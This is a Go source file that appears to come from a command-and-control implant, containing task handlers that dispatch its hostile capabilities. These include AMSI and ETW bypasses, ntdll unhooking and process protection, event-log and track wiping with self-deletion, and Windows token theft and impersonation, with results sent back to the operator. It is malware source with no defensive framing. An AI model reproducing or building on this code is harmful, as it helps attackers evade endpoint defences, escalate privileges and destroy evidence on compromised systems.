//go:build linux || windows
// +build linux windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func handleAMSIByPass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "amsi_bypass is Windows-only"
	} else {
		res.Output = amsiBypass()
	}
}

func handleETWByPass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "etw_bypass is Windows-only"
	} else {
		res.Output = etwBypass()
	}
}

func handleETWNtraceBypass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "etw_ntrace_bypass is Windows-only"
	} else {
		res.Output = etwNtTraceEvent()
	}
}

func handleAMSISessionBypass(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "amsi_session_bypass is Windows-only"
	} else {
		res.Output = amsiSessionBypass()
	}
}

func handleBlockDLLs(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "blockdlls is Windows-only"
	} else {
		res.Output = blockDLLs()
	}
}

func handleUnhookNtdll(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "unhook_ntdll is Windows-only"
	} else {
		res.Output = unhookNtdll()
	}
}

func handleProtectProcess(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "protect_process is Windows-only"
	} else {
		res.Output = protectProcess()
	}
}

// ── Cleanup / Anti-Forensics ────────────────────────────────────────────

func handleCleanup(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "cleanup is Windows-only"
	} else {
		var out string
		out += wipeEventLog() + "\n"
		out += wipeTracks() + "\n"
		out += selfDelete() + "\n"
		res.Output = out
		sendTaskResult(*res)
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}
}

func handleLogWipe(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "log_wipe is Windows-only"
	} else {
		res.Output = wipeEventLog()
	}
}

func handleTrackWipe(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "track_wipe is Windows-only"
	} else {
		res.Output = wipeTracks()
	}
}

func handleSelfDelete(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "self_delete is Windows-only"
	} else {
		res.Output = selfDelete()
	}
}

// ── Token ───────────────────────────────────────────────────────────────

func handleTokenListProcs(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	procs, err := tokenListProcesses()
	if err != nil {
		res.Error = err.Error()
	} else {
		data, _ := json.Marshal(procs)
		res.Output = base64.StdEncoding.EncodeToString(data)
		res.Encoding = "base64"
	}
}

func handleTokenSteal(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	pid, err := strconv.ParseUint(strings.TrimSpace(task.Command), 10, 32)
	if err != nil {
		res.Error = fmt.Sprintf("invalid pid: %v", err)
		return
	}
	dom, user, integ, err := tokenSteal(uint32(pid))
	if err != nil {
		res.Error = err.Error()
	} else {
		m := map[string]string{
			"domain":    dom,
			"username":  user,
			"integrity": integ,
			"pid":       task.Command,
			"whoami":    getCurrentTokenUser(),
		}
		data, _ := json.Marshal(m)
		res.Output = string(data)
	}
}

func handleTokenMake(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	domUser := task.Command
	password := task.Shell
	logonType := task.Path
	dom, user, integ, err := tokenMake(domUser, password, logonType)
	if err != nil {
		res.Error = err.Error()
	} else {
		m := map[string]string{
			"domain":     dom,
			"username":   user,
			"integrity":  integ,
			"logon_type": logonType,
			"whoami":     getCurrentTokenUser(),
		}
		data, _ := json.Marshal(m)
		res.Output = string(data)
	}
}

func handleTokenRevert(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	if err := tokenRevert(); err != nil {
		res.Error = err.Error()
	} else {
		whoami := getCurrentTokenUser()
		res.Output = fmt.Sprintf(`{"status":"reverted","whoami":%q}`, whoami)
	}
}

func handleTokenWhoami(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "token ops only on Windows"
		return
	}
	whoami := getCurrentTokenUser()
	res.Output = fmt.Sprintf(`{"whoami":%q}`, whoami)
}
